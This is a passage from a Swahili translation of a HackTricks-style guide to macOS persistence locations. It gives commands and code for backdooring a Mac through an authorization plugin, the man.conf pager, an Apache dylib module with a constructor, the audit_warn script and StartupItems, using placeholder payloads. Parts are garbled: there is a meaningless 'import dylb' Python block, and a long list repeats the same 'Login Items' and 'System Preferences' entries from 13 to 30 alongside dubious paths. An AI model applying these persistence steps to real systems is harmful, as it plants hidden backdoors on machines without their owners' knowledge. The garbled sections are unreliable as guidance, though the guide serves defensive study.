**Hamisha** kifurushi kwenye eneo ambalo litapakia:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Hatimaye ongeza **kanuni** ya kupakia Plugin hii:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** itawaambia mfumo wa idhini kwamba itahitaji **kuita kifaa cha nje kwa idhini**. Zaidi ya hayo, **`privileged`** itafanya ifanyike na mamlaka ya juu.

Chapisha kwa kutumia:
```bash
security authorize com.asdf.asdf
```
Na kisha **kikundi cha wafanyakazi kinapaswa kuwa na upatikanaji wa sudo** (soma `/etc/sudoers` ili kuthibitisha).

### Man.conf

Andika: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Inatumika kuzunguka sanduku la mchanga: [🟠](https://emojipedia.org/large-orange-circle)
* Lakini unahitaji kuwa na mizizi na mtumiaji lazima atumie man
* Kuzunguka TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* **`/private/etc/man.conf`**
* Inahitajika kuwa na mizizi
* **`/private/etc/man.conf`**: Wakati wowote man hutumiwa

#### Maelezo & Uvamizi

Faili ya usanidi **`/private/etc/man.conf`** inaonyesha faili ya binary / script ya kutumia wakati wa kufungua faili za nyaraka za man. Kwa hivyo njia ya kutekelezeka inaweza kubadilishwa ili kila wakati mtumiaji anapotumia man kusoma nyaraka fulani, mlango wa nyuma unatekelezwa.

Kwa mfano, weka katika **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Na kisha tengeneza `/tmp/view` kama ifuatavyo:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Maelezo**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Inatumika kuvuka sanduku ya mchanga: [🟠](https://emojipedia.org/large-orange-circle)
* Lakini unahitaji kuwa na mamlaka ya juu na apache inahitaji kuwa inafanya kazi
* Kuvuka TCC: [🔴](https://emojipedia.org/large-red-circle)
* Httpd haina ruhusa

#### Mahali

* **`/etc/apache2/httpd.conf`**
* Inahitaji mamlaka ya juu
* Kichocheo: Wakati Apache2 inaanza

#### Maelezo & Uvamizi

Unaweza kuonyesha katika `/etc/apache2/httpd.conf` ili kupakia moduli kwa kuongeza mstari kama huu:

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

Kwa njia hii moduli zako zilizopangwa zitapakiwa na Apache. Jambo pekee ni kwamba unahitaji **kuisaini na cheti halali cha Apple**, au unahitaji **kuongeza cheti kipya kilichothibitishwa** kwenye mfumo na **kuikisia**.

Kisha, ikihitajika, ili kuhakikisha kuwa seva itaanza unaweza kutekeleza:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Mfano wa nambari kwa Dylb:

```python
import dylb

def main():
    # Hapa ndipo unaweza kuandika nambari yako ya Dylb
    pass

if __name__ == "__main__":
    main()
```

Maelezo:
- Funguo la kuingia kwa Dylb linapatikana kwenye moduli ya `dylb`.
- Unaweza kuandika nambari yako ya Dylb ndani ya kipengele cha `main()`.
- Nambari ya Dylb itatekelezwa tu ikiwa faili ya Python inaendeshwa moja kwa moja, sio kama moduli iliyosanidiwa.
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### Mfumo wa ukaguzi wa BSM

Andika: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Inatumika kukiuka sanduku la mchanga: [🟠](https://emojipedia.org/large-orange-circle)
* Lakini unahitaji kuwa na mamlaka ya juu, auditd iwe inafanya kazi na kusababisha onyo
* Kukiuka TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* **`/etc/security/audit_warn`**
* Inahitaji mamlaka ya juu
* **Kichocheo**: Wakati auditd inagundua onyo

#### Maelezo na Uvamizi

Kila wakati auditd inagundua onyo, hati **`/etc/security/audit_warn`** inatekelezwa. Kwa hivyo unaweza kuongeza mzigo wako ndani yake.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Unaweza kulazimisha onyo na `sudo audit -n`.

### Vitu vya Kuanza

{% hint style="danger" %}
**Hii imepitwa na wakati, kwa hivyo haipaswi kupatikana katika saraka hizo.**
{% endhint %}

**StartupItem** ni saraka ambayo inapaswa kuwekwa ndani ya `/Library/StartupItems/` au `/System/Library/StartupItems/`. Mara baada ya saraka hii kuwekwa, lazima iwe na faili mbili maalum:

1. **rc script**: Script ya shell inayotekelezwa wakati wa kuanza.
2. **plist file**, iliyoitwa haswa `StartupParameters.plist`, ambayo ina mipangilio mbalimbali ya usanidi.

Hakikisha kuwa script ya rc na faili ya `StartupParameters.plist` zimewekwa kwa usahihi ndani ya saraka ya **StartupItem** ili mchakato wa kuanza uweze kuzitambua na kuzitumia.


{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% tab title="superservicename" %}

## Mahali pa Kuanza Kiotomatiki kwa MacOS

Katika MacOS, kuna maeneo kadhaa ambapo programu zinaweza kuwekwa ili kuanza kiotomatiki wakati mfumo unapoanza. Hii inaweza kuwa muhimu kwa programu zinazotumiwa mara kwa mara au huduma za mfumo.

### 1. LaunchAgents

LaunchAgents ni maeneo ambapo programu zinaweza kuwekwa ili kuanza kiotomatiki kwa mtumiaji fulani wakati wa kuingia. Faili za LaunchAgents zinapatikana katika saraka ya `~/Library/LaunchAgents`.

### 2. LaunchDaemons

LaunchDaemons ni maeneo ambapo programu zinaweza kuwekwa ili kuanza kiotomatiki kwa mfumo mzima wakati wa kuanza. Faili za LaunchDaemons zinapatikana katika saraka ya `/Library/LaunchDaemons` au `/System/Library/LaunchDaemons`.

### 3. Startup Items

Startup Items ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mfumo unapoanza. Hizi zinapatikana katika saraka ya `/Library/StartupItems` au `/System/Library/StartupItems`.

### 4. Login Items

Login Items ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji fulani anapoingia. Unaweza kuzipata katika Mipangilio ya Mfumo chini ya sehemu ya "Watumiaji na Vikundi".

### 5. Cron Jobs

Cron Jobs ni kazi zinazotekelezwa kiotomatiki kwa wakati uliopangwa. Unaweza kutumia amri ya `crontab -l` kuona orodha ya kazi zilizopangwa.

### 6. LaunchAgents ya Mfumo

LaunchAgents ya Mfumo ni maeneo ambapo programu zinaweza kuwekwa ili kuanza kiotomatiki kwa mtumiaji yeyote anapoingia. Faili za LaunchAgents ya Mfumo zinapatikana katika saraka ya `/System/Library/LaunchAgents`.

### 7. Login Hooks

Login Hooks ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji fulani anapoingia. Hizi zinapatikana katika saraka ya `/etc/loginhooks`.

### 8. SystemStarter

SystemStarter ni mfumo wa zamani wa kuanza kiotomatiki ambao hutumiwa katika toleo la zamani la MacOS. Faili za SystemStarter zinapatikana katika saraka ya `/System/Library/StartupItems`.

### 9. XPC Services

XPC Services ni huduma za mfumo ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mfumo unapoanza. Faili za XPC Services zinapatikana katika saraka ya `/Library/LaunchAgents` au `/System/Library/LaunchAgents`.

### 10. Login Scripts

Login Scripts ni hati ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji fulani anapoingia. Unaweza kuzipata katika Mipangilio ya Mfumo chini ya sehemu ya "Watumiaji na Vikundi".

### 11. Mach-O Binaries

Mach-O Binaries ni faili za programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mfumo unapoanza. Unaweza kutumia amri ya `launchctl list` kuona orodha ya Mach-O Binaries zinazoendesha.

### 12. Kernel Extensions

Kernel Extensions ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mfumo unapoanza. Unaweza kutumia amri ya `kextstat` kuona orodha ya Kernel Extensions zinazoendesha.

### 13. Login Items ya Mfumo

Login Items ya Mfumo ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji yeyote anapoingia. Unaweza kuzipata katika Mipangilio ya Mfumo chini ya sehemu ya "Watumiaji na Vikundi".

### 14. System Preferences

System Preferences ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji fulani anapoingia. Unaweza kuzipata katika Mipangilio ya Mfumo chini ya sehemu ya "Watumiaji na Vikundi".

### 15. Login Items ya Mfumo

Login Items ya Mfumo ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji yeyote anapoingia. Unaweza kuzipata katika Mipangilio ya Mfumo chini ya sehemu ya "Watumiaji na Vikundi".

### 16. System Preferences

System Preferences ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji fulani anapoingia. Unaweza kuzipata katika Mipangilio ya Mfumo chini ya sehemu ya "Watumiaji na Vikundi".

### 17. Login Items ya Mfumo

Login Items ya Mfumo ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji yeyote anapoingia. Unaweza kuzipata katika Mipangilio ya Mfumo chini ya sehemu ya "Watumiaji na Vikundi".

### 18. System Preferences

System Preferences ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji fulani anapoingia. Unaweza kuzipata katika Mipangilio ya Mfumo chini ya sehemu ya "Watumiaji na Vikundi".

### 19. Login Items ya Mfumo

Login Items ya Mfumo ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji yeyote anapoingia. Unaweza kuzipata katika Mipangilio ya Mfumo chini ya sehemu ya "Watumiaji na Vikundi".

### 20. System Preferences

System Preferences ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji fulani anapoingia. Unaweza kuzipata katika Mipangilio ya Mfumo chini ya sehemu ya "Watumiaji na Vikundi".

### 21. Login Items ya Mfumo

Login Items ya Mfumo ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji yeyote anapoingia. Unaweza kuzipata katika Mipangilio ya Mfumo chini ya sehemu ya "Watumiaji na Vikundi".

### 22. System Preferences

System Preferences ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji fulani anapoingia. Unaweza kuzipata katika Mipangilio ya Mfumo chini ya sehemu ya "Watumiaji na Vikundi".

### 23. Login Items ya Mfumo

Login Items ya Mfumo ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji yeyote anapoingia. Unaweza kuzipata katika Mipangilio ya Mfumo chini ya sehemu ya "Watumiaji na Vikundi".

### 24. System Preferences

System Preferences ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji fulani anapoingia. Unaweza kuzipata katika Mipangilio ya Mfumo chini ya sehemu ya "Watumiaji na Vikundi".

### 25. Login Items ya Mfumo

Login Items ya Mfumo ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji yeyote anapoingia. Unaweza kuzipata katika Mipangilio ya Mfumo chini ya sehemu ya "Watumiaji na Vikundi".

### 26. System Preferences

System Preferences ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji fulani anapoingia. Unaweza kuzipata katika Mipangilio ya Mfumo chini ya sehemu ya "Watumiaji na Vikundi".

### 27. Login Items ya Mfumo

Login Items ya Mfumo ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji yeyote anapoingia. Unaweza kuzipata katika Mipangilio ya Mfumo chini ya sehemu ya "Watumiaji na Vikundi".

### 28. System Preferences

System Preferences ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji fulani anapoingia. Unaweza kuzipata katika Mipangilio ya Mfumo chini ya sehemu ya "Watumiaji na Vikundi".

### 29. Login Items ya Mfumo

Login Items ya Mfumo ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji yeyote anapoingia. Unaweza kuzipata katika Mipangilio ya Mfumo chini ya sehemu ya "Watumiaji na Vikundi".

### 30. System Preferences

System Preferences ni programu ambazo zinaweza kuwekwa ili kuanza kiotomatiki wakati mtumiaji fulani anapoingia. Unaweza kuzipata katika Mipangilio ya Mfumo chini ya sehemu ya "Watumiaji na Vikundi".

{% endtab %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
Sijaweza kupata sehemu hii kwenye macOS yangu, kwa habari zaidi angalia writeup
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Kuletwa na Apple, **emond** ni mfumo wa kuingiza kumbukumbu ambao unaonekana kuwa haujatengenezwa vizuri au labda umetelekezwa, lakini bado unapatikana. Ingawa haileti faida kubwa kwa msimamizi wa Mac, huduma hii isiyoeleweka inaweza kutumika kama njia ya kudumu kwa wahalifu wa mtandao, ambayo huenda isigunduliwe na wengi wa wasimamizi wa macOS.

Kwa wale wanaofahamu uwepo wake, kugundua matumizi mabaya ya **emond** ni rahisi. LaunchDaemon ya mfumo kwa huduma hii inatafuta hati za kutekelezwa katika saraka moja. Kwa kuangalia hii, amri ifuatayo inaweza kutumika:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Mahali

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Inahitaji mizizi
* **Kichocheo**: Pamoja na XQuartz

#### Maelezo & Udukuzi

XQuartz **haipo tena imewekwa kwenye macOS**, kwa hivyo ikiwa unataka habari zaidi angalia maelezo.

### ~~kext~~

{% hint style="danger" %}
Ni ngumu sana kusakinisha kext hata kama ni mizizi, kwa hivyo sitazingatia hii kutoroka kutoka kwa sanduku za mchanga au hata kwa utulivu (isipokuwa una shambulio)
{% endhint %}

#### Mahali

Ili kusakinisha KEXT kama kipengele cha kuanza, inahitaji kusakinishwa kwenye moja ya maeneo yafuatayo:

* `/System/Library/Extensions`
* Faili za KEXT zilizojengwa katika mfumo wa uendeshaji wa OS X.
* `/Library/Extensions`
* Faili za KEXT zilizosakinishwa na programu ya tatu

Unaweza kuorodhesha faili za kext zilizosakinishwa kwa sasa na:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Kwa habari zaidi kuhusu [**kernel extensions angalia sehemu hii**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Mahali

* **`/usr/local/bin/amstoold`**
* Inahitaji mizizi (root)

#### Maelezo & Utekaji

Inaonekana `plist` kutoka `/System/Library/LaunchAgents/com.apple.amstoold.plist` ilikuwa ikitumia binary hii wakati inafichua huduma ya XPC... swali ni kwamba binary haikuwepo, kwa hivyo unaweza kuweka kitu hapo na wakati huduma ya XPC inaitwa, binary yako itaitwa.

Sioni tena hii kwenye macOS yangu.

### ~~xsanctl~~

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Mahali

* **`/Library/Preferences/Xsan/.xsanrc`**
* Inahitaji mizizi (root)
* **Kichocheo**: Wakati huduma inaendeshwa (kwa nadra)

#### Maelezo & Utekaji

Inaonekana sio kawaida sana kuendesha hati hii na sikuweza hata kuipata kwenye macOS yangu, kwa hivyo ikiwa unataka habari zaidi angalia maelezo.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**Hii haifanyi kazi katika toleo za kisasa za MacOS**
{% endhint %}

Pia ni muhimu kuweka **amri ambazo zitatekelezwa wakati wa kuanza.** Mfano wa hati ya kawaida ya rc.common:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Mbinu na zana za kudumu

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
